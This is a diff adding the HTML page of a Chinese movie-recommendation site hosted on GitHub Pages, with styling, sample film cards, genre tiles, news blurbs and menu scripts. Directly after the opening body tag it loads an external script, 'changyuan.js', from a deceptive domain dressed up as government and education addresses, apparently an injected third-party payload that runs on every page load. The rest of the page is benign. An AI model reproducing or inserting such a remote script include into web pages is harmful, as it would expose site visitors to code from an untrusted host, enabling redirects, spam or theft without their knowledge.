@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>爱爱电影网 - 您的专属电影推荐平台 | aiaidianyingwang-top</title>
+    <meta name="keywords" content="爱爱电影网, aiaidianyingwang-top, 电影推荐, 高分电影, 最新电影, 电影资讯">
+    <meta name="description" content="爱爱电影网 (aiaidianyingwang-top.github.io) 提供最新电影推荐、高分片单、电影分类及影迷资讯，发现好电影，从爱爱电影网开始。">
+    <link rel="canonical" href="https://aiaidianyingwang-top.github.io">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="爱爱电影网 - 您的专属电影推荐平台">
+    <meta property="og:description" content="提供最新电影推荐、高分片单、电影分类及影迷资讯，发现好电影，从爱爱电影网开始。">
+    <meta property="og:url" content="https://aiaidianyingwang-top.github.io">
+    <meta property="og:type" content="website">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* 毛玻璃容器通用样式 */
+        .glass {
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+        }
+
+        a { text-decoration: none; color: #fff; transition: all 0.3s ease; }
+        a:hover { color: #ffd700; }
+        ul { list-style: none; }
+
+        /* 头部导航 */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            padding: 1rem 0;
+            transition: all 0.3s ease;
+        }
+        header.scrolled { background: rgba(0, 0, 0, 0.2); backdrop-filter: blur(15px); }
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo { font-size: 1.8rem; font-weight: 800; letter-spacing: 1px; text-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+        .logo span { color: #ffd700; }
+        nav ul { display: flex; gap: 2rem; }
+        nav a { font-weight: 500; font-size: 1rem; padding: 0.5rem 1rem; border-radius: 20px; }
+        nav a:hover { background: rgba(255,255,255,0.2); }
+        .mobile-menu-btn { display: none; background: none; border: none; color: #fff; font-size: 1.8rem; cursor: pointer; }
+
+        /* 主容器 */
+        main { padding-top: 80px; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem 1rem; }
+
+        /* 栏目一：首页 Hero */
+        .hero {
+            text-align: center;
+            padding: 6rem 1rem 4rem;
+            position: relative;
+        }
+        .hero h1 { font-size: 3.5rem; font-weight: 900; margin-bottom: 1rem; text-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .hero p { font-size: 1.2rem; margin-bottom: 2rem; opacity: 0.9; max-width: 600px; margin-left: auto; margin-right: auto; }
+        .search-box {
+            max-width: 500px;
+            margin: 0 auto;
+            display: flex;
+            background: rgba(255,255,255,0.2);
+            border-radius: 30px;
+            padding: 0.5rem;
+            border: 1px solid rgba(255,255,255,0.3);
+        }
+        .search-box input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            padding: 0.8rem 1.5rem;
+            color: #fff;
+            font-size: 1rem;
+        }
+        .search-box input::placeholder { color: rgba(255,255,255,0.7); }
+        .search-box button {
+            background: #ffd700;
+            color: #333;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 25px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        .search-box button:hover { transform: scale(1.05); }
+
+        /* 栏目二：精选片单 */
+        .section { padding: 4rem 0; }
+        .section-title {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        .section-title h2 { font-size: 2.2rem; font-weight: 800; margin-bottom: 0.5rem; }
+        .section-title p { opacity: 0.8; }
+        .movie-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+        }
+        .movie-card {
+            border-radius: 20px;
+            overflow: hidden;
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+        }
+        .movie-card:hover { transform: translateY(-10px); box-shadow: 0 15px 40px rgba(0,0,0,0.3); }
+        .movie-poster {
+            height: 300px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 4rem;
+            position: relative;
+        }
+        .movie-info { padding: 1.5rem; }
+        .movie-info h3 { font-size: 1.2rem; margin-bottom: 0.5rem; }
+        .movie-info .rating { color: #ffd700; font-weight: 700; }
+
+        /* 栏目三：电影分类 */
+        .categories {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1.5rem;
+        }
+        .category-item {
+            padding: 2rem 1rem;
+            text-align: center;
+            border-radius: 20px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .category-item:hover { background: rgba(255,255,255,0.25); transform: scale(1.05); }
+        .category-item .icon { font-size: 2.5rem; margin-bottom: 1rem; }
+        .category-item h3 { font-size: 1.1rem; font-weight: 600; }
+
+        /* 栏目四：影迷资讯 */
+        .news-list { display: flex; flex-direction: column; gap: 1.5rem; }
+        .news-item {
+            display: flex;
+            align-items: center;
+            padding: 1.5rem;
+            border-radius: 20px;
+            transition: all 0.3s;
+        }
+        .news-item:hover { background: rgba(255,255,255,0.2); }
+        .news-date {
+            min-width: 80px;
+            text-align: center;
+            padding-right: 1.5rem;
+            border-right: 2px solid rgba(255,255,255,0.3);
+            margin-right: 1.5rem;
+        }
+        .news-date .day { font-size: 2rem; font-weight: 800; line-height: 1; }
+        .news-date .month { font-size: 0.9rem; opacity: 0.8; }
+        .news-content h3 { font-size: 1.3rem; margin-bottom: 0.5rem; }
+        .news-content p { opacity: 0.8; line-height: 1.6; }
+
+        /* 页脚 */
+        footer {
+            margin-top: 4rem;
+            padding: 3rem 0 1rem;
+            background: rgba(0,0,0,0.2);
+            backdrop-filter: blur(10px);
+        }
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1rem;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+        .footer-section h4 { font-size: 1.2rem; margin-bottom: 1rem; color: #ffd700; }
+        .footer-section p, .footer-section li { opacity: 0.8; margin-bottom: 0.5rem; }
+        .footer-section ul { display: flex; flex-direction: column; gap: 0.5rem; }
+        .footer-bottom {
+            text-align: center;
+            padding-top: 2rem;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            opacity: 0.7;
+            font-size: 0.9rem;
+        }
+
+        /* 响应式 */
+        @media (max-width: 768px) {
+            .mobile-menu-btn { display: block; }
+            nav ul {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: rgba(0,0,0,0.4);
+                backdrop-filter: blur(15px);
+                flex-direction: column;
+                padding: 1rem 0;
+                text-align: center;
+            }
+            nav ul.active { display: flex; }
+            .hero h1 { font-size: 2.2rem; }
+            .news-item { flex-direction: column; text-align: center; }
+            .news-date { border-right: none; border-bottom: 2px solid rgba(255,255,255,0.3); padding-right: 0; padding-bottom: 1rem; margin-right: 0; margin-bottom: 1rem; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <header id="header">
+        <div class="nav-container">
+            <div class="logo">爱爱<span>电影网</span></div>
+            <nav>
+                <button class="mobile-menu-btn" id="menuBtn">☰</button>
+                <ul id="navMenu">
+                    <li><a href="#">首页</a></li>
+                    <li><a href="#featured">精选片单</a></li>
+                    <li><a href="#categories">电影分类</a></li>
+                    <li><a href="#news">影迷资讯</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero">
+            <div class="container">
+                <h1>发现好电影，从爱爱开始</h1>
+                <p>爱爱电影网 (aiaidianyingwang-top.github.io) 为您提供最新、最热的电影推荐与资讯，让每一部好电影都不被错过。</p>
+                <div class="search-box">
+                    <input type="text" placeholder="搜索电影、导演、演员...">
+                    <button>搜索</button>
+                </div>
+            </div>
+        </section>
+
+        <section id="featured" class="section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>精选片单</h2>
+                    <p>编辑精选，不容错过的优质电影</p>
+                </div>
+                <div class="movie-grid">
+                    <div class="movie-card glass">
+                        <div class="movie-poster" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);">🎬</div>
+                        <div class="movie-info">
+                            <h3>肖申克的救赎</h3>
+                            <p class="rating">⭐ 9.7分 · 剧情/励志</p>
+                        </div>
+                    </div>
+                    <div class="movie-card glass">
+                        <div class="movie-poster" style="background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);">🎭</div>
+                        <div class="movie-info">
+                            <h3>阿甘正传</h3>
+                            <p class="rating">⭐ 9.5分 · 剧情/爱情</p>
+                        </div>
+                    </div>
+                    <div class="movie-card glass">
+                        <div class="movie-poster" style="background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);">🌊</div>
+                        <div class="movie-info">
+                            <h3>泰坦尼克号</h3>
+                            <p class="rating">⭐ 9.4分 · 爱情/灾难</p>
+                        </div>
+                    </div>
+                    <div class="movie-card glass">
+                        <div class="movie-poster" style="background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);">🎨</div>
+                        <div class="movie-info">
+                            <h3>盗梦空间</h3>
+                            <p class="rating">⭐ 9.3分 · 科幻/悬疑</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="categories" class="section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>电影分类</h2>
+                    <p>按类型探索你喜欢的电影</p>
+                </div>
+                <div class="categories">
+                    <div class="category-item glass">
+                        <div class="icon">😂</div>
+                        <h3>喜剧片</h3>
+                    </div>
+                    <div class="category-item glass">
+                        <div class="icon">💑</div>
+                        <h3>爱情片</h3>
+                    </div>
+                    <div class="category-item glass">
+                        <div class="icon">🔫</div>
+                        <h3>动作片</h3>
+                    </div>
+                    <div class="category-item glass">
+                        <div class="icon">👽</div>
+                        <h3>科幻片</h3>
+                    </div>
+                    <div class="category-item glass">
+                        <div class="icon">😱</div>
+                        <h3>恐怖片</h3>
+                    </div>
+                    <div class="category-item glass">
+                        <div class="icon">🎪</div>
+                        <h3>动画片</h3>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section id="news" class="section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>影迷资讯</h2>
+                    <p>最新电影资讯与深度影评</p>
+                </div>
+                <div class="news-list">
+                    <div class="news-item glass">
+                        <div class="news-date">
+                            <div class="day">20</div>
+                            <div class="month">OCT</div>
+                        </div>
+                        <div class="news-content">
+                            <h3>2024年最值得期待的10部华语电影</h3>
+                            <p>从春节档到国庆档，今年华语电影市场佳作云集，张艺谋、陈凯歌等名导新作即将亮相...</p>
+                        </div>
+                    </div>
+                    <div class="news-item glass">
+                        <div class="news-date">
+                            <div class="day">18</div>
+                            <div class="month">OCT</div>
+                        </div>
+                        <div class="news-content">
+                            <h3>诺兰新作《奥本海默》深度解析</h3>
+                            <p>克里斯托弗·诺兰再次挑战叙事极限，这部传记片如何展现原子弹之父的内心世界？</p>
+                        </div>
+                    </div>
+                    <div class="news-item glass">
+                        <div class="news-date">
+                            <div class="day">15</div>
+                            <div class="month">OCT</div>
+                        </div>
+                        <div class="news-content">
+                            <h3>流媒体时代的电影院生存之道</h3>
+                            <p>随着Netflix、Disney+等平台的崛起，传统电影院如何转型？IMAX、杜比影院等新技术带来新体验。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <div class="footer-section">
+                <h4>关于爱爱电影网</h4>
+                <p>爱爱电影网致力于为广大影迷提供最优质的电影推荐服务，让每个人都能找到自己喜欢的电影。</p>
+            </div>
+            <div class="footer-section">
+                <h4>快速链接</h4>
+                <ul>
+                    <li><a href="#">首页</a></li>
+                    <li><a href="#featured">精选片单</a></li>
+                    <li><a href="#categories">电影分类</a></li>
+                    <li><a href="#news">影迷资讯</a></li>
+                </ul>
+            </div>
+            <div class="footer-section">
+                <h4>联系我们</h4>
+                <ul>
+                    <li>网站名称：爱爱电影网</li>
+                    <li>网站网址：https://aiaidianyingwang-top.github.io</li>
+                    <li>邮箱：contact@aiaidianyingwang-top.github.io</li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>&copy; 2024 爱爱电影网 (aiaidianyingwang-top.github.io) 保留所有权利。本站仅作展示用途，所有电影资源均来自互联网。</p>
+        </div>
+    </footer>
+
+    <script>
+        // 移动端菜单切换
+        const menuBtn = document.getElementById('menuBtn');
+        const navMenu = document.getElementById('navMenu');
+        menuBtn.addEventListener('click', () => {
+            navMenu.classList.toggle('active');
+        });
+
+        // 滚动时头部样式变化
+        const header = document.getElementById('header');
+        window.addEventListener('scroll', () => {
+            if (window.scrollY > 50) {
+                header.classList.add('scrolled');
+            } else {
+                header.classList.remove('scrolled');
+            }
+        });
+
+        // 平滑滚动
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth' });
+                    navMenu.classList.remove('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
